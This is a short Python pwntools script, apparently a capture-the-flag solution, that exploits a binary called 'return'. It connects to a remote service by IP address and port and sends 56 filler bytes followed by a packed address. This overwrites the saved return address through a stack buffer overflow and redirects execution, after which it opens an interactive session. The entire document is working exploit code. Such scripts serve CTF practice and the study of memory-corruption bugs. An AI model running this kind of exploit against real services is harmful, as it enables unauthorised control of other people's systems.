from pwn import *
#r = process('./return')
r = remote('140.110.112.31', 2118)
addr = p64(0x4006b7)
payload = 'a' * 56 + addr
r.send(payload)
r.interactive()
